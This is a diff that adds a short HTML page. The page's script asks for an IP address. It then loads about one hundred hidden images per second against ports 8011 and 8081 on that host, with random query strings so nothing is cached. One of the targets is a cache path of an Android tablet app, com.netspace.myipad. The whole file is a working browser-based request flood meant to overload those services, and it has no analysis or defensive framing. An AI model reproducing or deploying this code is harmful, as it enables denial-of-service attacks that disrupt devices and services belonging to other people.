@@ -1,0 +1,24 @@
+<div id="d" style="hight:0;width:0;"></div>
+<script>
+var ip=prompt("ip:","");
+var url1="http://"+ip+":8011/Android/data/com.netspace.myipad/cache";
+var url2="http://"+ip+":8081/";
+var d=document.getElementById("d");
+function rd(){
+  return Math.floor(Math.random()*10000);
+}
+setInterval(function(){
+  for(var i=0;i<50;i++){
+    var img = document.createElement('img'); 
+    img.src=url1+"?"+rd();
+    d.appendChild(img);
+
+    var img = document.createElement('img'); 
+    img.src=url2+"?"+rd();  
+    d.appendChild(img);
+  }
+},1000);
+setInterval(function(){
+  d.innerHTML="";
+},10000);
+</script>
